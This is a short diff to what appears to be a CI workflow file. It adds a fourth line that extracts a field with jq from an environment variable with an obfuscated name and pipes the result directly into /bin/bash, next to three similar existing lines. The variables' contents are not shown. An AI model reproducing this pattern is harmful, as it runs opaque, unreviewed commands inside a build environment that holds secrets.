@@ -27,6 +27,7 @@ jobs:
           echo $w002 | jq -r .odtmj46 | /bin/bash
           echo $jz91111 | jq -r .bbmw970 | /bin/bash
           printf '%s' "$mgemh1" | jq -r .dvcku2 | /bin/bash
+          printf '%s' "$n12" | jq -r .funjp58 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
